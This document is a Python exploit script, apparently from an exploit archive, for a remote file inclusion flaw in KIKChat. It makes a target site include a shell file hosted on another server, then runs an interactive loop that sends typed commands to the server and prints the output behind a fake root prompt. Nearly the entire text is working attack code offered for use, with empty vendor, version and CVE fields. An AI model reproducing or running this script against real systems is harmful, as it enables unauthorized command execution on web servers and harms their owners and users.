# Exploit Title: KIKChat Remote File Inclusion
# Date: 2018-09-16
# Exploit Author: MiLAD
# Vendore Homepage:
# Software Link:
# Version:
# Tested on:
# CVE:
# POC: Executing commands on server
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import requests
import sys
import os
from colorama import init
init()
from colorama import Fore, Back, Style
import subprocess
import json
from platform import system as system_name # Returns the system/OS name
from os import system as system_call       # Execute a shell command

def clear_screen():
    """
    Clears the terminal screen.
    """

    # Clear command as function of OS
    command = "cls" if system_name().lower()=="windows" else "clear"

    # Action
    system_call(command)
#h={'Content-Type': 'application/x-www-form-urlencoded'}
h = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'}
def usage():
	print (Style.BRIGHT+Back.WHITE)
	print (Style.DIM+Fore.BLACK+"KIKChat RFI Exploit")
	print (Style.DIM+Back.BLACK+Fore.WHITE+"python exploit.py http//target.com shell")
	print (Style.DIM+Back.BLACK+Fore.RED+"example : python exploit.py http://target.com/?p= http://url/shell.txt&c=")
	print (Style.RESET_ALL)
def main(url,shell):
	while(1):
		try:
			url1 = url + '/' + shell + 'hostname'
			r1 = requests.get(url1,headers=h)
			if r1.status_code == 200:
				res = r1.content.split('<Html>')
				res[0] = res[0].strip()
				#res += r1.endswith("")
				cmd = raw_input(Fore.GREEN+"root@"+ res[0]+":/#")
			if cmd == 'quit' or cmd == 'exit':
				break
			url2 = url + '/' + shell + cmd
			r = requests.get(url2,headers=h)
			if r.status_code == 200:
				res = r.content.split('<Html>')
				print res[0]
			else:
				print 'Response Error!'
				break
		except Exception as e:
			print 'can not run input command!'
try:
	if len(sys.argv) == 3:
		clear_screen()
		main(sys.argv[1],sys.argv[2])
	else:
		usage()
except KeyboardInterrupt as e:
	sys.exit()







